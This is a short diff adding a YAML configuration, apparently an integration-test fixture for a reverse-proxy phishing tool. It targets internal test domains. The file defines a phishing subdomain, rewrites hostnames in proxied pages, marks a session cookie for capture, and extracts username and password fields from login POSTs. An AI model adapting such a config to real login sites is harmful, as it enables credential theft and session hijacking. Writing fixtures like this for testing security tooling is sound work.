@@ -1,0 +1,35 @@
+name: testsite
+author: integration-tests
+version: "1"
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    testsite.internal
+    is_landing: true
+
+sub_filters:
+  - hostname: login.testsite.internal
+    mime_types: [text/html]
+    search: "login\\.testsite\\.internal"
+    replace: "{hostname}"
+
+auth_tokens:
+  - domain: "phish.test"
+    keys:
+      - name: session
+        required: true
+
+credentials:
+  username:
+    key: "^username$"
+    search: "^(.+)$"
+    type: post
+  password:
+    key: "^password$"
+    search: "^(.+)$"
+    type: post
+
+login:
+  domain: login.testsite.internal
+  path:   /login
